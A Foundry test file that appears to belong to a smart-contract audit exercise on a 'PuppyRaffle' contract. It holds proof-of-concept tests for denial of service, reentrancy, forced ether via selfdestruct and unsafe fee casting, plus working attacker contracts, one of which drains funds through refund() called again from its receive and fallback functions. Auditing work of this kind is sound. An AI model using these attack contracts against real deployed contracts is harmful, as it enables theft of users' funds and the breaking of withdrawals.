// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract Exploits is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = makeAddr("feeAddress");
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(
            entranceFee,
            feeAddress,
            duration
        );
    }

    function test_dos() public {
        //Setting the gas price to 1
        vm.txGasPrice(1);
        //Lets enter 1000 players
        address[] memory players = new address[](1000);
        for(uint i = 0; i<1000; i++){
            players[i] = address(i);
        }
        //Gas cost for entering the first 1000 players
        uint256 gasStartA = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndA = gasleft();
        uint256 gasUsedA = (gasStartA - gasEndA) * tx.gasprice;
        console.log("Gas cost for entering the first 1000 players: ", gasUsedA);

        //Lets enter another 1000 players
        for(uint i = 0; i<1000; i++){
            players[i] = address(i+1000);
        }
        //Gas cost for entering the second 1000 players
        uint256 gasStartB = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEndB = gasleft();
        uint256 gasUsedB = (gasStartB - gasEndB) * tx.gasprice;
        console.log("Gas cost for entering the second 1000 players: ", gasUsedB);

        assertTrue(gasUsedA < gasUsedB);
    }

    function test_getActivePlayersIndexReturnsZeroWhenPlayerIsInZeroPosition() public {
        address[] memory players = new address[](1);
        players[0] = address(1);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        assertEq(puppyRaffle.getActivePlayerIndex(address(1)), 0);
    }

    function test_ReentrancyAttack() public {
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);

        uint256 attackerContractStartingBalance = address(attackerContract).balance;
        uint256 puppyRaffleStartingBalance = address(puppyRaffle).balance;

        console.log("Starting balance of PuppyRaffle is: ", puppyRaffleStartingBalance);
        console.log("Starting balance of Attacker is: ", attackerContractStartingBalance);

        vm.prank(attacker);
        attackerContract.attack{value: entranceFee}();

        uint256 attackerContractEndingBalance = address(attackerContract).balance;
        uint256 puppyRaffleEndingBalance = address(puppyRaffle).balance;

        console.log("Ending balance of PuppyRaffle is: ", puppyRaffleEndingBalance);
        console.log("Ending balance of Attacker is: ", attackerContractEndingBalance);
    }

    function test_SelfdestructToBreakWithdraw() public {
        //Enter players
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
        //Select winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Balances before
        console.log("Balance of contract before attack: ", address(puppyRaffle).balance);
        console.log("Balance of fees before attack: ", puppyRaffle.totalFees());
        //Selfdestruct attacker contract
        SelfdestructAttack attackerContract = new SelfdestructAttack(puppyRaffle);
        address attacker = makeAddr("attacker");
        vm.prank(attacker);
        vm.deal(attacker, 1 wei);
        attackerContract.attack{value: 1 wei}();
        //Balances
        console.log("Balance of contract after attack: ", address(puppyRaffle).balance);
        console.log("Balance of fees after attack: ", puppyRaffle.totalFees());
        //Withdraw
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }

    function test_UnsafeTypeCastingOfFees() public {
        //Lets enter 100 players
        address[] memory players = new address[](100);
        for(uint i = 0; i<100; i++){
            players[i] = address(i);
        }
        //Gas cost for entering the first 1000 players
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        //Calculate expected fees to be collected
        uint256 totalAmountCollected = address(puppyRaffle).balance;
        uint256 fee = (totalAmountCollected * 20) / 100;
        console.log("Balance of PuppyRaffle before selectWinner: ", address(puppyRaffle).balance);
        console.log("Fees calculated to be collected: ", fee);
        //Select Winner
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        //Actual fees to be collected
        console.log("Balance of PuppyRaffle after selectWinner: ", address(puppyRaffle).balance);
        console.log("Value of totalFees after select winner: ", puppyRaffle.totalFees());
        //Assertions
        assertTrue(fee > type(uint64).max);
        assertTrue(puppyRaffle.totalFees() < fee);
        assertTrue(puppyRaffle.totalFees() < type(uint64).max);
    }
}

contract ReentrancyAttacker {
    
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle){
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealBalance() internal {
        if(address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable{
        _stealBalance();
    }

    receive() external payable{
        _stealBalance();
    }
}

contract SelfdestructAttack {
    PuppyRaffle puppyRaffle;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
    }

    function attack() public payable {
        address payable addr = payable(address(puppyRaffle));
        selfdestruct(addr);
    }
}